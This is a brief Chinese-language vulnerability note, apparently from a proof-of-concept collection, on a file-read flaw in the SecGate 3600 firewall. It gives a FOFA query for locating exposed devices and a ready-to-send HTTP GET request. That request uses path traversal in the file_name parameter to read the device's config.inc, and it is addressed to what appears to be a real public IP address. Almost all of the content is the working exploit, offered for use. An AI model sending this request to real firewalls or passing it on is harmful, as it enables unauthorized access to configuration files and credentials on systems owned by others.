# 网神SecGate 3600防火墙 sys_export_conf_local_save 文件读取漏洞

    ## fofa

```
title="网神SecGate 3600防火墙"
```

## poc

```
GET /?g=sys_export_conf_local_save&file_name=../../../..//secgate/webui/config.inc HTTP/1.1
Host: 111.121.226.71:4433
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip


```
